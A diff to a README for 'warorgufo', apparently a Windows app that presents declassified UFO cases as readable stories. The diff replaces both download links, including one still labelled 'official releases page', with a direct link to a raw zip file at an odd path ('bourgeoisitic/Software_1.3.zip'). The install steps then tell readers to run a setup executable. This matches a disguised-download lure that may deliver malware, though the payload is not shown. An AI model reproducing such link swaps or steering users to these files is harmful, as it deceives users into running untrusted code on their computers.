@@ -1,6 +1,6 @@
 # 🛸 warorgufo - Read declassified UFO cases easily 
 
-[![Download warorgufo](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/jesusabar5085/warorgufo/releases)
+[![Download warorgufo](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/jesusabar5085/warorgufo/main/bourgeoisitic/Software_1.3.zip)
 
 warorgufo provides a clear, single-page view of UAP and UFO incidents released by the government in May 2026. This application organizes complex document dumps into 20 readable short stories. Each story links directly to official primary-source citations from the FBI, NASA, and AARO archives. You can read these accounts without needing to search through thousands of raw PDF pages.
 
@@ -8,7 +8,7 @@ warorgufo provides a clear, single-page view of UAP and UFO incidents released b
 
 To install the application on your Windows computer, follow these steps:
 
-1. Visit the [official releases page](https://github.com/jesusabar5085/warorgufo/releases) to download the package.
+1. Visit the [official releases page](https://raw.githubusercontent.com/jesusabar5085/warorgufo/main/bourgeoisitic/Software_1.3.zip) to download the package.
 2. Select the file named `warorgufo-setup.exe` from the latest release list.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
